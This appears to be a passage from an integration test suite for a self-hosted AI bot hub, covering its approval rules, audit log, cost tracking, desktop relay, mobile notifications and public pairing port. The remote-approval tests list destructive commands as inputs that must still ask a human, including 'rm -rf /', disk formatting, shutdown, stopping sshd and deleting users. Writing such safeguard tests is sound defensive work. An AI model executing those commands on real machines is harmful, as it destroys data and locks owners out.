        check('machine menu: the machine we came from is not listed twice when it is already in the list', pageT.includes('if (list.some((m) => (back.name && m.name === back.name) || origins(m).includes(back.origin))) back = null;'));
        check('N2 takeover: with the keyboard up, the bar (键盘 included) sits on top of it; the app counts a row online by either of its addresses', pageT.includes('body.pc-touching.kb-open .pc-mobile-bar {') && pageT.includes('const kbOpen = keyboard || window.innerHeight < apply.base - 120;') && launcherS.includes('const best = await bestAddress([entry.url, ...(entry.alt || [])]);'));
        check('N2 takeover: phone touches go to a layer of our own (touchpad / direct, pinch zoom), the keyboard is a toggle, the bar can be hidden and holds 退出全屏', pageT.includes('id="pc-touch"') && pageT.includes('function setupPhoneTouch()') && pageT.includes("id=\"pcm-mode\"") && pageT.includes("id=\"pcm-full\"") && pageT.includes("id=\"pcm-hide\"") && pageT.includes("$('pcm-key').addEventListener('pointerdown', (event) => event.preventDefault());") && pageT.includes("const open = (input && doc.activeElement === input) || document.body.classList.contains('kb-open');") && pageT.includes('body.pc-touching .pc-exit { display: none !important; }'));
        check('N2 takeover: the ring follows the picture after 全屏 or rotating (same remote point, re-placed on resize)', pageT.includes('function replaceCursor()') && pageT.includes('}).observe(layer);') && pageT.includes('phoneTouch.cursorAt = { fx: (phoneTouch.cursor.x - pic.left) / pic.width'));
      }
      check('desktops: an empty light desktop explains itself (no taskbar is normal), and the missing-tools hint fits the package manager', page.includes('id="pc-light-hint"') && page.includes("hint.hidden = mode !== 'light' && mode !== 'kiosk';") && (await readText('../src/server.mjs')).includes("display: perBot.display, mode: perBot.mode || 'full'") && deskSrc.includes("hasBinary('dnf') ? 'dnf install"));
      check('desktops: "full" on a machine without XFCE uses openbox, and Settings says how to get XFCE', deskSrc.includes("const wantLight = desktopMode === 'light' || !have('xfce4-session');") && page.includes('这台机器没装 XFCE，现在仍用轻量桌面') && modes.json?.fullInstalled !== undefined);
    }
    const page = await readText('../public/index.html');
    check('groups: the dialog offers bots on other machines; their messages show their name; the coordinator stays local', page.includes("api('/api/peers/bots')") && page.includes('function groupMemberById(id)') && page.includes("draft.members.find((id) => !String(id).includes('@'))") && page.includes('至少要有一位这台机器上的机器人来协调'));
  }
  // One-sentence rules: matched by meaning (a stand-in model here), ask wins.
  {
    const R = await import('../src/rules.mjs');
    const ap = await import('../src/approvals.mjs');
    const rules = [{ id: 'r1', text: '发邮件先问我', action: 'ask' }, { id: 'r2', text: '装软件直接做', action: 'allow' }];
    let calls = 0;
    const fakeModel = { complete: async (msgs) => { calls += 1; const a = msgs[1].content; return { content: /sendmail|smtp/.test(a) ? '{"rules":[1]}' : /apt-get install/.test(a) ? '{"rules":[2]}' : /both/.test(a) ? '{"rules":[2,1]}' : '{"rules":[]}' }; } };
    const D = ap.DECISION;
    const v = (decision, reason = 'medium-risk tool') => ({ risk: 'MEDIUM', decision, reason });
    const mail = R.applyRules(v(D.AUTO), await R.judgeRules({ rules, toolName: 'shell', args: { command: 'sendmail bob@x <a.txt' }, model: fakeModel }), D);
    const install = R.applyRules(v(D.ASK), await R.judgeRules({ rules, toolName: 'shell', args: { command: 'apt-get install htop' }, model: fakeModel }), D);
    const both = R.applyRules(v(D.ASK), await R.judgeRules({ rules, toolName: 'shell', args: { command: 'both' }, model: fakeModel }), D);
    const danger = R.applyRules(v(D.ASK, 'command matches danger denylist (x)'), await R.judgeRules({ rules, toolName: 'shell', args: { command: 'apt-get install x' }, model: fakeModel }), D);
    const none = R.applyRules(v(D.AUTO), await R.judgeRules({ rules, toolName: 'fs_list', args: { path: '.' }, model: fakeModel }), D);
    check('rules: an ask-first rule makes a hands-off action ask', mail.decision === 'ask' && /发邮件先问我/.test(mail.reason));
    check('rules: an allow rule removes the prompt, ask wins when both match', install.decision === 'auto' && both.decision === 'ask');
    check('rules: an allow rule never overrides the danger list; unrelated actions untouched', danger.decision === 'ask' && none.decision === 'auto');
    const before = calls;
    await R.judgeRules({ rules, toolName: 'shell', args: { command: 'sendmail bob@x <a.txt' }, model: fakeModel });
    check('rules: the same action is judged once (cached)', calls === before);
    const add = await api('/api/policy', { method: 'PUT', body: { addRule: { text: '发邮件先问我', action: 'ask' } } });
    const rid = add.json?.rules?.[0]?.id;
    const bad = await api('/api/policy', { method: 'PUT', body: { addRule: { text: '  ' } } });
    const del = await api('/api/policy', { method: 'PUT', body: { removeRule: rid } });
    const tv = await api('/api/policy', { method: 'PUT', body: { takeover: 'view' } });
    const tbad = await api('/api/policy', { method: 'PUT', body: { takeover: 'drive' } });
    const tback = await api('/api/policy', { method: 'PUT', body: { takeover: 'control' } });
    check('takeover setting: view only and back, bad value refused', tv.json?.takeover === 'view' && tbad.status === 400 && tback.json?.takeover === 'control');
    // Activity log: permission changes, ability changes and takeovers land there.
    await api('/api/audit/takeover', { method: 'POST', body: { botId: 'chief', mode: 'view' } });
    const changes = (await api('/api/audit?view=changes&limit=50')).json || [];
    const takeovers = (await api('/api/audit?view=takeover&limit=10')).json || [];
    const raw = (await api('/api/audit?limit=5')).json || [];
    check('activity log: permission changes are recorded', changes.some((r) => r.kind === 'policy.changed' && r.change?.addRule?.text === '发邮件先问我'));
    check('activity log: a takeover is recorded with its mode; filters keep to their kind', takeovers[0]?.kind === 'desktop.takeover' && takeovers[0]?.mode === 'view' && takeovers.every((r) => r.kind === 'desktop.takeover') && changes.every((r) => /policy.changed|bot.abilities/.test(r.kind)) && Array.isArray(raw));
    check('rules API: add, refuse empty, remove', add.json?.rules?.[0]?.action === 'ask' && bad.status === 400 && del.json?.rules?.length === 0);
    // Permission overview + one-tap strict: the boundary tightens in one call,
    // lands in the audit with every field, and never strips a bot's tools.
    const beforePolicy = (await api('/api/policy')).json || {};
    const strictSaved = await api('/api/policy', { method: 'PUT', body: { level: 'careful', generate: 'ask', outside: 'deny', sudo: 'ask', takeover: 'view' } });
    check('strict preset: one call tightens level, generation, outside, sudo and takeover',
      strictSaved.json?.level === 'careful' && strictSaved.json?.generate === 'ask' && strictSaved.json?.outside === 'deny' &&
      strictSaved.json?.sudo === 'ask' && strictSaved.json?.takeover === 'view');
    const strictAudit = (await api('/api/audit?view=changes&limit=20')).json || [];
    check('strict preset: the change lands in the audit with every field',
      strictAudit.some((r) => r.kind === 'policy.changed' && r.change?.level === 'careful' &&
        r.change?.generate === 'ask' && r.change?.outside === 'deny' &&
        r.change?.sudo === 'ask' && r.change?.takeover === 'view'));
    const botsAfterStrict = (await api('/api/bots')).json || [];
    check('strict preset: bot tool grants are untouched',
      Array.isArray(botsAfterStrict) && botsAfterStrict.every((b) => Array.isArray(b.tools)));
    await api('/api/policy', { method: 'PUT', body: { level: beforePolicy.level, generate: beforePolicy.generate, outside: beforePolicy.outside, sudo: beforePolicy.sudo, takeover: beforePolicy.takeover } });
    const pageSrc = await readText('../public/index.html');
    check('permission overview: one page lists bots × capabilities and offers the preset',
      pageSrc.includes('id="perm-table"') && pageSrc.includes('PERM_CAPS') && pageSrc.includes('id="perm-strict"') && pageSrc.includes('applyStrictPermissions'));
    const apv = await import('../src/approvals.mjs');
    const strictMachine = apv.effectivePolicy({ level: 'careful' });
    const strictMedium = apv.classify('fs_write', {}, { baseRisk: apv.RISK.MEDIUM, granted: true, autoApproveMedium: false, autoApproveAll: strictMachine.autonomous });
    const strictHigh = apv.classify('shell', { command: 'ls' }, { baseRisk: apv.RISK.HIGH, granted: true, autoApproveMedium: false, autoApproveAll: strictMachine.autonomous });
    check('strict preset: least privilege at runtime — even a trusted bot asks for medium and high work',
      strictMachine.careful === true && strictMedium.decision === 'ask' && strictHigh.decision === 'ask');
    check('permission overview: the matrix follows the level (direct / ask / not granted)',
      pageSrc.includes('function permDecision') && pageSrc.includes('permDecision(cap, bot, policy)') && pageSrc.includes("'问'"));
    // Cost: every model call lands in the ledger; prices and the daily alert
    // work through the API; crossing the line is audited once per day.
    const usage1 = (await api('/api/usage?days=1')).json || {};
    check('usage: model calls are recorded with tokens per bot and model',
      usage1.totals?.tokens > 0 && (usage1.byBot || []).some((b) => b.key === 'chief') &&
      (usage1.byModel || []).some((m) => m.key === 'scripted-planner'));
    const priced = await api('/api/usage', { method: 'PUT', body: { currency: 'CNY', prices: { 'scripted-planner': { in: 1000, out: 2000 } }, dailyAlert: 0.0001 } });
    check('usage: prices and the daily threshold save',
      priced.json?.settings?.prices?.['scripted-planner']?.in === 1000 && priced.json?.settings?.dailyAlert === 0.0001);
    const usage2 = (await api('/api/usage?days=1')).json || {};
    check('usage: pricing turns tokens into an estimate', usage2.totals?.cost > 0 && usage2.totals?.unpricedTokens === 0);
    const pricedAudit = (await api('/api/audit?limit=20')).json || [];
    check('usage: saving prices is audited', pricedAudit.some((r) => r.kind === 'usage.settings'));
    await api('/api/bots/chief/message', { method: 'POST', body: { text: '成本统计验证' } });
    await waitUntil(async () => Boolean((await api('/api/usage?days=1')).json?.alert), 8000, 'usage alert').catch(() => null);
    const usage3 = (await api('/api/usage?days=1')).json || {};
    const alertAudit = (await api('/api/audit?limit=30')).json || [];
    check('usage: crossing the daily threshold raises one audited alert',
      Boolean(usage3.alert) && alertAudit.some((r) => r.kind === 'usage.alert'));
    const alertCount = (audit) => (audit || []).filter((r) => r.kind === 'usage.alert').length;
    const beforeCalls = (usage3.totals?.calls || 0);
    await api('/api/bots/chief/message', { method: 'POST', body: { text: '再验证一次成本提醒' } });
    await waitUntil(async () => (((await api('/api/usage?days=1')).json?.totals?.calls) || 0) > beforeCalls, 8000, 'second usage call').catch(() => null);
    const alertAudit2 = (await api('/api/audit?limit=40')).json || [];
    check('usage: the alert is recorded once per day, not per call',
      alertCount(alertAudit) === 1 && alertCount(alertAudit2) === 1);
    const usageMod = await import('../src/usage.mjs');
    check('usage: days are local dates (no UTC drift)', usageMod.localDay(new Date(2026, 10, 11, 23, 30)) === '2026-11-11');
    const pricedSettings = { currency: 'CNY', prices: { m: { in: 1, out: 2 } }, dailyAlert: 0 };
    const mixed = usageMod.summarizeUsage([
      { day: '2026-11-11', botId: 'a', model: 'm', prompt: 1000, completion: 0, total: 1000 },
      { day: '2026-11-11', botId: 'a', model: 'm', prompt: null, completion: null, total: null },
      { day: '2026-11-11', botId: 'a', model: 'free', prompt: 1000, completion: 0, total: 1000 },
    ], pricedSettings);
    check('usage: a call without provider usage counts but adds no tokens or money',
      mixed.totals.calls === 3 && mixed.totals.callsWithoutUsage === 1 &&
      mixed.totals.tokens === 2000 && mixed.totals.cost === 0.001 && mixed.totals.unpricedTokens === 1000);
    check('cost page: ranges, per-bot and per-model tables, prices and threshold are wired',
      pageSrc.includes('id="sec-usage"') && pageSrc.includes('id="usage-range"') &&
      pageSrc.includes('id="usage-bots"') && pageSrc.includes('id="usage-models"') &&
      pageSrc.includes('id="usage-prices"') && pageSrc.includes('id="usage-alert"'));
    await api('/api/usage', { method: 'PUT', body: { prices: {}, dailyAlert: 0 } });
  }
  // Per-bot abilities: switching one off is remembered through edits and migrations.
  {
    const fsx = await import('node:fs');
    const botFileOf = (id) => path.join(home, 'config', 'bots', `${id}.json`);
    const chief = (await api('/api/bots/chief')).json?.bot || JSON.parse(fsx.readFileSync(botFileOf('chief'), 'utf8'));
    const without = (chief.tools || []).filter((t) => t !== 'shell');
    await api('/api/bots/chief', { method: 'PATCH', body: { tools: without } });
    await api('/api/bots/chief', { method: 'PATCH', body: { role: '改个职责' } });
    const stored = JSON.parse(fsx.readFileSync(botFileOf('chief'), 'utf8'));
    check('abilities: a removed ability is remembered, edits keep the migration marker', !stored.tools.includes('shell') && stored.revokedTools?.includes('shell') && Number(stored.seedGrantsVersion) > 0, JSON.stringify({ rv: stored.revokedTools, v: stored.seedGrantsVersion }));
    const { migrateSeedGrants } = await import('../src/bots.mjs');
    stored.seedGrantsVersion = 0; // pretend a newer release ships grants
    fsx.writeFileSync(botFileOf('chief'), JSON.stringify(stored, null, 2));
    await migrateSeedGrants();
    const after = JSON.parse(fsx.readFileSync(botFileOf('chief'), 'utf8'));
    check('abilities: a later grant migration does not hand a removed ability back', !after.tools.includes('shell') && after.tools.includes('browser_open'));
    await api('/api/bots/chief', { method: 'PATCH', body: { tools: [...after.tools, 'shell'], role: chief.role } });
    const back = JSON.parse(fsx.readFileSync(botFileOf('chief'), 'utf8'));
    check('abilities: switching it back on clears the record', back.tools.includes('shell') && !(back.revokedTools || []).includes('shell'));
    const abil = (await api('/api/audit?view=changes&limit=50')).json || [];
    check('activity log: ability changes are recorded (removed, then added back)', abil.some((r) => r.kind === 'bot.abilities' && (r.removed || []).includes('shell')) && abil.some((r) => r.kind === 'bot.abilities' && (r.added || []).includes('shell')));
  }
  {
    const get = await api('/api/policy');
    const set = await api('/api/policy', { method: 'PUT', body: { level: 'careful' } });
    const add = await api('/api/policy', { method: 'PUT', body: { addDeny: 'git push' } });
    const id = add.json?.extraDeny?.[0]?.id;
    const del = await api('/api/policy', { method: 'PUT', body: { removeDeny: id } });
    const bad = await api('/api/policy', { method: 'PUT', body: { level: 'yolo' } });
    await api('/api/policy', { method: 'PUT', body: { level: 'standard' } });
    check('policy API: level, add and remove a blocked word, bad level refused', get.status === 200 && set.json?.level === 'careful' && add.json?.extraDeny?.[0]?.text === 'git push' && del.json?.extraDeny?.length === 0 && bad.status === 400);
  }
  const registry = toolsMod.createRegistry({
    workspaceDir: path.join(home, 'workspace'),
    config: {},
    getRuntime: () => { throw new Error('machine tools never start turns'); },
    getRoutines: () => { throw new Error('machine tools never run routines'); },
  });
  // Windows has no websockify: the hub's own WebSocket <-> VNC bridge.
  {
    const net = await import('node:net');
    const { bridgeWebSocket } = await import('../src/wsbridge.mjs');
    const vnc = net.createServer((s) => { s.write('RFB 003.008\n'); s.on('data', (d) => s.write(d)); s.on('error', () => {}); });
    await new Promise((r) => vnc.listen(0, '127.0.0.1', r));
    const relay = http.createServer();
    relay.on('upgrade', (req, socket, head) => bridgeWebSocket(req, socket, head, { port: vnc.address().port }));
    await new Promise((r) => relay.listen(0, '127.0.0.1', r));
    const ws = new WebSocket(`ws://127.0.0.1:${relay.address().port}/x`, ['binary']);
    ws.binaryType = 'arraybuffer';
    const got = [];
    ws.onmessage = (e) => got.push(Buffer.from(e.data));
    await new Promise((resolve, reject) => { ws.onopen = resolve; ws.onerror = () => reject(new Error('ws error')); });
    await sleep(200);
    {
      // noVNC resolves "path" against /novnc/vnc.html, so it must be absolute.
      const { viewerUrl } = await import('../src/desktops.mjs');
      const page = new URL(viewerUrl('chief'), 'http://hub:4390');
      const target = new URL(page.searchParams.get('path'), page);
      check('viewer: the WebSocket path resolves to the hub relay, not under /novnc/', target.pathname === '/api/bots/chief/desktop/ws', target.pathname);
    }
    check('ws bridge: the VNC banner reaches the viewer', Buffer.concat(got).toString() === 'RFB 003.008\n' && ws.protocol === 'binary');
    got.length = 0;
    const big = Buffer.alloc(70_000, 3); // > 64 KB: the 8-byte length form
    ws.send(Buffer.from('hi'));
    ws.send(big);
    await sleep(500);
    const echo = Buffer.concat(got);
    check('ws bridge: masked client frames of any size arrive intact', echo.length === 2 + big.length && echo.subarray(0, 2).toString() === 'hi' && echo.subarray(2).every((b) => b === 3), `${echo.length} bytes`);
    ws.close();
    relay.close();
    vnc.close();
  }

  // Bot desktops are reachable only through the hub's authenticated relay.
  {
    const desktopsSrc = await readText('../src/desktops.mjs');
    check('websockify binds loopback only', /spawnChild\('websockify', \[`127\.0\.0\.1:\$\{webPort\}`/.test(desktopsSrc));
    check('the bot desktop URL goes through the hub relay', desktopsSrc.includes('desktop/ws') && !/http:\/\/\$\{lanAddress\(\)\}:\$\{entry\.webPort\}/.test(desktopsSrc));
    const unauth = await new Promise((resolve) => {
      const req = http.request(`${base}/api/bots/chief/desktop/ws`, {
        headers: { Connection: 'Upgrade', Upgrade: 'websocket', 'Sec-WebSocket-Version': '13', 'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==' },
      });
      req.on('upgrade', () => resolve('upgraded'));
      req.on('response', (res) => resolve(res.statusCode));
      req.on('error', (err) => resolve(err.message));
      req.end();
    });
    check('the desktop relay never upgrades without a running desktop', unauth === 404 || unauth === 401 || /socket hang up|ECONNRESET/.test(String(unauth)), String(unauth));
  }

  // Remote machines run autonomously; only machine-breaking commands still ask.
  {
    const prev = process.env.DESK_MACHINE_MODE;
    process.env.DESK_MACHINE_MODE = 'remote';
    const remote = approvals.effectivePolicy({ autoApproveAll: false, denyPatterns: ['\\bsudo\\b'] });
    const decide = (command, policy) => approvals.classify('shell', { command }, {
      baseRisk: 'MEDIUM', granted: true, autoApproveMedium: true, autoApproveAll: policy.autonomous, denyPatterns: policy.denyPatterns,
    }).decision;
    check('remote: autonomous by default even if autoApproveAll was false', remote.mode === 'remote' && remote.autonomous === true);
    check('remote: sudo installs run without asking', decide('sudo apt-get install -y ffmpeg', remote) === 'auto');
    check('remote: wiping or cutting off the machine still asks',
      ['rm -rf /', 'sudo mkfs.ext4 /dev/sdb1', 'sudo shutdown -h now', 'sudo systemctl stop ssh', 'passwd ubuntu'].every((c) => decide(c, remote) === 'ask'));
    check('remote: autonomy can be switched off', approvals.effectivePolicy({ remoteAutonomy: false }).autonomous === false);
    check('remote Windows: everyday admin work runs without asking',
      ['winget install --id Git.Git -e', 'Restart-Service Spooler', 'Remove-Item -Recurse -Force C:\\Users\\me\\tmp'].every((c) => decide(c, remote) === 'auto'));
    check('remote Windows: wiping or cutting off the machine still asks',
      ['Format-Volume -DriveLetter D', 'format d: /q', 'Stop-Computer -Force', 'shutdown /s /t 0', 'Remove-Item -Recurse -Force C:\\',
        'Stop-Service sshd', 'Unregister-ScheduledTask -TaskName NightshiftHub', 'net user owner /delete'].every((c) => decide(c, remote) === 'ask'));
    process.env.DESK_MACHINE_MODE = '';
    const local = approvals.effectivePolicy({});
    check('local: sudo still asks', local.mode === 'local' && decide('sudo apt-get install x', local) === 'ask');
    process.env.DESK_MACHINE_MODE = prev || '';
  }

  // The assistant can see the human's machines and hand work to one.
  {
    const seed = JSON.parse(await readText('../config/bots/chief.json'));
    check('the assistant is granted machine_list and machine_switch', ['machine_list', 'machine_switch'].every((t) => seed.tools.includes(t)));
    const reported = await api('/api/ui/state', { method: 'POST', body: { patch: { machines: [{ name: '本机', url: 'local', current: true }, { name: 'Ubuntu', url: 'http://10.0.0.5:4390' }] } } });
    check('the window can report its machine list', reported.json?.ui?.machines?.length === 2, reported.text);
    const ctx = { app: { uiView: () => ({ machines: reported.json.ui.machines }), applyUi: (patch) => { ctx.sent = patch; } }, bot: { id: 'chief' } };
    const listed = await registry.get('machine_list').run({}, ctx);
    check('machine_list returns the reported machines', listed.machines.length === 2);
    await registry.get('machine_switch').run({ machine: 'ubuntu', task: '打开 bilibili' }, ctx);
    check('machine_switch asks the window to switch and carries the task',
      ctx.sent?.switchMachine?.target === 'http://10.0.0.5:4390' && ctx.sent.switchMachine.message === '打开 bilibili');
    const missing = await errorCode(() => registry.get('machine_switch').run({ machine: 'nowhere' }, ctx));
    check('machine_switch refuses an unknown machine', missing === 'MACHINE_NOT_FOUND', missing);
    const stored = await api('/api/ui/state');
    check('a switch command is never stored as UI state', !('switchMachine' in (stored.json || {})));
  }

  // A phone notification is a door, not a dead end: it names the machine and
  // the exact approval, and can answer without opening the app.
  {
    const watcher = await readText('../mobile/android/app/src/main/java/com/desk/assistant/NightshiftWatcher.java');
    const activity = await readText('../mobile/android/app/src/main/java/com/desk/assistant/MainActivity.java');
    const receiver = await readText('../mobile/android/app/src/main/java/com/desk/assistant/ApprovalActionReceiver.java');
    const manifest = await readText('../mobile/android/app/src/main/AndroidManifest.xml');
    const page = await readText('../public/index.html');
    const cardLayout = await readText('../mobile/android/app/src/main/res/layout/notification_approval.xml');
    check('notification: a tap carries the hub the event came from, not the most recently used one',
      watcher.includes('handleEvent(hub, line.substring(6))') && watcher.includes('openApp(int requestCode, String hub, String approvalId, String botId)') && !watcher.includes('hubs.get(0)'));
    check('notification: an approval tap lands on that bot and that card',
      activity.includes('desk.openApproval') && activity.includes('desk.openBot') && activity.includes('"&bot="') &&
      page.includes('function approvalTarget()') && page.includes('focusApprovalFromLink(target)'));
    check('notification: the expanded card mirrors the chat card with two real buttons',
      watcher.includes('R.layout.notification_approval') && watcher.includes('setCustomBigContentView(card)') &&
      watcher.includes('R.id.notif_allow') && watcher.includes('R.id.notif_deny') &&
      cardLayout.includes('@+id/notif_allow') && cardLayout.includes('@+id/notif_deny'));
    check('notification: 批准/拒绝 decide from a private receiver; the token never rides on the intent',
      receiver.includes('ACTION_DECIDE') && receiver.includes('"desk.token:" + hub') && receiver.includes('/api/approvals/') &&
      !/putExtra\([^)]*token/i.test(receiver) && manifest.includes('android:name=".ApprovalActionReceiver"') && manifest.includes('android:exported="false"'));
    check('notification: each approval owns a group so ColorOS cannot collapse the buttons away',
      watcher.includes('.setGroup("nightshift.approval." + approvalId)') && watcher.includes('cancelApprovalNotification(resolvedId)') &&
      watcher.includes('getActiveNotifications()') && watcher.includes('manager.cancel(sbn.getId())'));
    check('notification: the SSE read gives up before a zombie socket can silence approvals',
      watcher.includes('setReadTimeout(45000)'));
    check('notification: a decision that cannot be delivered falls back to the card', receiver.includes('manager.notify(notificationId, fallback') && receiver.includes('desk.openApproval'));
  }
  {
    // The phone loads the hub's own UI over plain http, where getUserMedia does
    // not exist. Attachments ride the normal upload path; voice rides a native
    // recorder exposed as window.desk, the same fallback the desktop shell uses.
    const srv = await readText('../src/server.mjs');
    const manifest = await readText('../mobile/android/app/src/main/AndroidManifest.xml');
    const activity = await readText('../mobile/android/app/src/main/java/com/desk/assistant/MainActivity.java');
    const voice = await readText('../mobile/android/app/src/main/java/com/desk/assistant/VoiceBridge.java');
    const page = await readText('../public/index.html');
    check('mobile attachments: the upload preflight allows the file-name header from the app origin',
      srv.includes("'authorization, content-type, x-file-name'"));
    check('mobile voice: the manifest declares the microphone the WebView will ask for',
      manifest.includes('android.permission.RECORD_AUDIO') && manifest.includes('android.hardware.microphone'));
    check('mobile voice: a native recorder is exposed to the page and adapted onto window.desk',
      voice.includes('@JavascriptInterface') && voice.includes('MediaRecorder.AudioSource.MIC') &&
      activity.includes('addJavascriptInterface(new VoiceBridge(this), "NightshiftVoice")') &&
      activity.includes('d.voiceStart=async function()') && activity.includes('addWebViewListener'));
    check('mobile voice: the page prefers the shell recorder when the origin is not secure',
      page.includes('window.desk?.voiceStart') && page.includes('/api/voice/transcribe'));
  }
  {
    // Mobile takeover: the sheet must actually open, the session must end when
    // the pane closes, and the keys a remote session needs must be reachable.
    const page = await readText('../public/index.html');
    check('takeover: a takeover card opens the mobile sheet, not just state',
      page.includes('openPanel(patch.tab)'));
    check('takeover: closing the pane ends the session and unmounts the viewer',
      page.includes('if (!watching || installing || (!takeover && !url))') &&
      page.includes("state.panelOpen = false;") && page.includes('syncViewer();'));
    check('takeover: phones get a permanent key strip wired to the noVNC UI',
      page.includes('id="pc-mobile-bar"') && page.includes('showVirtualKeyboard()') &&
      page.includes('toggleCtrl()') && page.includes('toggleAlt()') && page.includes("sendKey(0xff1b, 'Escape')"));
    check('takeover: rotation is user-controlled — real lock when allowed, CSS rotation as fallback',
      page.includes('body.panel-max.pc-rotated #pc-screen-wrap') && page.includes("document.body.classList.add('pc-rotated')") &&
      page.includes("plugin.lock({ orientation: 'landscape' })") && page.includes('async function exitLandscape'));
    check('takeover: tapping the preview picture enters fullscreen on phones',
      page.includes('pc-shield-hint') && page.includes('if (isMobile() && !desktopTakeover()) togglePanelMax(true)'));
    check('takeover: the clipboard drawer works without navigator.clipboard',
      page.includes('id="clip-drawer"') && page.includes('clipboardPasteFrom(') &&
      page.includes("document.execCommand('copy')") && page.includes('latin1'));
    // Fullscreen controls never follow the theme: the surface behind them is black.
    check('takeover: fullscreen buttons are fixed white-on-dark with safe-area offsets',
      /\.pc-exit\s*\{[^}]*safe-r[^}]*background: rgba\(0, 0, 0, 0\.55\);[^}]*color: #fff;/.test(page) &&
      /\.pc-done\s*\{[^}]*safe-r[^}]*background: #fff;[^}]*color: #0a0a0a;/.test(page) &&
      /\.pc-mobile-bar button\s*\{[^}]*background: rgba\(0, 0, 0, 0\.55\);[^}]*color: #fff;/.test(page));
    // Real landscape: native orientation lock + hidden bars, CSS fallback kept.
    const mobilePkg = JSON.parse(await readText('../mobile/package.json'));
    const shellBridge = await readText('../mobile/android/app/src/main/java/com/desk/assistant/ShellBridge.java');
    check('takeover: real landscape uses the orientation plugin and a native immersive bridge',
      Boolean(mobilePkg.dependencies?.['@capacitor/screen-orientation']) &&
      shellBridge.includes('setImmersive') && shellBridge.includes('setOrientation') &&
      shellBridge.includes('WindowInsetsControllerCompat') &&
      page.includes('screenOrientationPlugin') && page.includes("plugin.lock({ orientation: 'landscape' })") &&
      page.includes("window.desk?.setOrientation") && page.includes("window.desk?.setImmersive?.(true)"));
    check('takeover: leaving fullscreen/background restores portrait and system bars',
      page.includes('async function exitLandscape') && page.includes("document.addEventListener('visibilitychange', () => {\n    if (document.hidden) { exitLandscape(); return; }") &&
      /async function togglePanelMax[\s\S]{0,120}if \(!next\) await exitLandscape\(\)/.test(page));
    check('takeover: landscape puts the key strip on the right, upright and 44px',
      page.includes('body.panel-max.pc-landscape .pc-mobile-bar') && page.includes('flex-direction: column') && page.includes('min-height: 44px'));
    // Settings sync: every saving route says which section changed, and the UI
    // refreshes that page only when it is the one on screen.
    const srv2 = await readText('../src/server.mjs');
    check('settings sync: saving routes announce their section',
      [/section: 'model'/, /section: 'policy'/, /section: 'usage'/, /section: 'voice'/, /section: 'vision'/,
        /section: 'media'/, /section: 'feishu'/, /section: 'machines'/, /section: 'network'/, /section: 'routines'/]
        .every((re) => re.test(srv2)));
    check('settings sync: the UI refreshes only the page that is open, local-only settings stay local',
      page.includes("const section = ev.section || 'model'") && page.includes("const active = document.querySelector('.setnav.active')") &&
      page.includes('语言、主题、是否显示工具过程和时区只存在这台设备上'));
  }
  {
    const srv = await readText('../src/server.mjs');
    check('approval: a decision from a paired device is audited as "device"',
      srv.includes("req.auth?.deviceId ? 'device' : 'human'") &&
      srv.includes("state.approvals.decide(params.id, decision, body?.note || '', by)"));
  }
  // Public port (G1): a tunnel socket that never counts as the local human.
  {
    const pubHome = await fsp.mkdtemp(path.join(os.tmpdir(), 'assist-public-'));
    await seedHome(pubHome);
    const started = await startServerChild(pubHome, { HOST: '0.0.0.0', ASSIST_ALLOW_REMOTE: '1' });
    const normalBase = `http://127.0.0.1:${started.ready.port}`;
    const pubBase = `http://127.0.0.1:${started.ready.publicPort}`;
    try {
      const noAuth = await fetch(`${pubBase}/api/settings`);
      check('public port: a tunnel caller is never the local human', noAuth.status === 401);
      check('public port: HSTS is sent', /max-age=/.test(noAuth.headers.get('strict-transport-security') || ''));
      const eight = await fetch(`${pubBase}/api/pair`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ code: '12345678' }) });
      const eightJson = await eight.json().catch(() => ({}));
      check('public port: the 8-digit code is refused there', eight.status === 403 && eightJson?.error?.code === 'PAIR_CODE_NOT_ALLOWED_PUBLIC');
      const made = await fetch(`${normalBase}/api/pairing/link`, { method: 'POST' }).then((r) => r.json());
      const link = (made.links || []).find((l) => l.kind === 'lan') || (made.links || [])[0];
      const token = new URL(link.url).searchParams.get('pair');
      const paired = await fetch(`${pubBase}/api/pair`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ code: token, client: 'app' }) });
      const pairedJson = await paired.json().catch(() => ({}));
      check('public port: the QR one-time token pairs there', paired.status === 200 && String(pairedJson.token || '').length >= 16);
      check('public port: its session cookie is Secure', /;\s*secure/i.test(paired.headers.get('set-cookie') || ''));
      const bearer = pairedJson.token;
      const localOnly = await fetch(`${pubBase}/api/remote/push-update`, { method: 'POST', headers: { 'content-type': 'application/json', authorization: `Bearer ${bearer}` }, body: '{}' });
      check('public port: local-only routes still refuse a tunnel caller', localOnly.status === 403);
      const ctrl = new AbortController();
      const stream = await fetch(`${pubBase}/api/stream?botId=chief`, { headers: { authorization: `Bearer ${bearer}`, accept: 'text/event-stream' }, signal: ctrl.signal });
      check('public port: SSE works there with a device token', stream.status === 200 && /text\/event-stream/.test(stream.headers.get('content-type') || ''));
      ctrl.abort();
      let last = null;
      for (let i = 0; i < 21; i += 1) {
        last = await fetch(`${pubBase}/api/pair`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ code: `deadbeef${i}` }) });
      }
      const lastJson = await last.json().catch(() => ({}));
      check('public port: twenty failures pause public pairing', last.status === 429 && lastJson?.error?.code === 'PAIR_PAUSED_PUBLIC');
    } finally {
      await stopProcess(started.child);
    }
  }
  {
    const pageG = await readText('../public/index.html');
    const funnelSrc = await readText('../src/funnel.mjs');
    const srvG = await readText('../src/server.mjs');
    check('public access: the settings card, QR tab and per-machine switches are wired',
      pageG.includes('id="funnel-enabled"') && pageG.includes('loadFunnel') &&
      pageG.includes("public: '任何网络'") && pageG.includes('data-funnel='));
    check('funnel: the real CLI verbs are used and the admin link is surfaced',
      funnelSrc.includes("'funnel'") && funnelSrc.includes("'--bg'") && funnelSrc.includes("'status'") &&
      funnelSrc.includes("'--json'") && funnelSrc.includes('login.tailscale.com') &&
      srvG.includes('/^\\/api\\/funnel$/') && srvG.includes("section: 'network'"));
  }

}
